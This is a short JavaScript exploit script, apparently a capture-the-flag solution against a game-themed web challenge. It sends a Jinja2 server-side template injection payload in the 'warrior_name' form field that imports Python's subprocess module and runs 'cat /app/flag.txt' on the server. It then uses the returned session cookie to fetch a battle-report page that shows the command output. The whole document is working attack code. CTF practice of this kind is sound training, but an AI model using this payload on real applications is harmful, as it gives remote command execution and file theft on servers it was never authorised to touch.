const params = new URLSearchParams();
params.set(
    "warrior_name",
    `{{request.application.__globals__.__builtins__.__import__('subprocess').check_output(['cat', '/app/flag.txt'])}}`,
);
const res = await fetch("http://94.237.54.232:42958/begin", {
    headers: {
        accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "accept-language": "en-US,en;q=0.9",
        "cache-control": "max-age=0",
        "content-type": "application/x-www-form-urlencoded",
        "upgrade-insecure-requests": "1",
        Referer: "http://94.237.54.232:42958/",
        "Referrer-Policy": "strict-origin-when-cross-origin",
    },
    body: params.toString(),
    method: "POST",
});
console.log(res.headers);
const sessionId = res.headers.get("set-cookie")?.split(";")[0]?.split("=")[1];
console.log(sessionId);

const params2 = new URLSearchParams();
params2.set("session", sessionId);
const res2 = await fetch("http://94.237.54.232:42958/battle-report", {
    headers: {
        accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "accept-language": "en-US,en;q=0.9",
        "cache-control": "max-age=0",
        "content-type": "application/x-www-form-urlencoded",
        "upgrade-insecure-requests": "1",
        cookie: params2.toString(),
        Referer: "http://94.237.54.232:42958/flamedrake",
        "Referrer-Policy": "strict-origin-when-cross-origin",
    },
    body: "damage_dealt=74&damage_taken=110&spells_cast=2&turns_survived=3&outcome=defeat&battle_duration=18.979",
    method: "POST",
});
console.log(await res2.text());
